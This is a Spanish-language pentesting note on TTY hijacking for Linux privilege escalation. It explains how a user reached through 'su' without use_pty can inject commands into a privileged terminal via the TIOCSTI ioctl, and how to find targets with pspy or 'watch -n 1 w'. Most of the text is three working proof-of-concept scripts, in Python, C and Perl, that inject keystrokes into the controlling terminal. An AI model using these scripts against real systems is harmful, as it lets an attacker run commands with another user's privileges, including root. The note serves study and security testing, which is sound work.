-----
- Tags: #teoria #practica #escalada 
------
# TTY 

### Una **TTY** es un dispositivo de caracteres que realiza la entrada y la salida de carácter en carácter. La comunicación entre los dispositivos de termina y los programas que los leen y escriben está controlada por la interfaz tty.

-----
# TTY Hijack 

### Cuando un usuario ejecuta **su $USER** o **su -u $USER** (A menos que se establezca la opción **use_pty**) ese mismo **\$USER** puede aprovecharse de esta terminal del otro usuario con privilegios haciendo uso de la función **TIOCSTI ictl** para inyectar comandos en esta terminal privilegiada y por lo tanto con los permisos correspondientes. 

-----
# Explotación

### Para explotar esta vulnerabilidad, primero debemos identificar al usuario privilegiado ejecutando el comando **su -u**, esto podríamos hacerlo hacinedo uso de herramientas como **pspy** o scripts propios para reconocer comandos ejecutados a nivel de sistema.

### Teniendo en cuenta el comando **w**, el cual nos permite verificar que usuarios estan logueados y que estan realizando, podríamos detectar a un usuario privilegiado. (**watch -n 1 w**)

### Una vez detectado esto, solo haría falta ejecutar un script en **c**, **perl** o **python** para abusar de esta vulnerabilidad. Recomendado leer el [post](https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking) donde se habla de esta vulnerabilidad.

## PoC Python
```python
#!/usr/bin/python3
import os
import fcntl
import termios

def main():
    fd = os.open("/dev/tty", os.O_RDWR)
    if fd < 0:
        print("open")
        return -1

    x = "exit\necho Payload as `whoami`\n"
    for c in x:
        ret = fcntl.ioctl(fd, termios.TIOCSTI, c.encode())
        if ret == -1:
            print("ioctl()")
    
    os.close(fd)
    return 0

if __name__ == "__main__":
    main()
```

## PoC C
```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>

int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\necho Payload as `whoami`\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
```

## PoC Perl
```perl
#!/usr/bin/perl

require "sys/ioctl.ph";
open my $tty_fh, '<', '/dev/tty' or die $!;
foreach my $c (split //, "exit\n".'echo Payload as $(whoami)'.$/) {
    ioctl($tty_fh, &TIOCSTI, $c);
}
```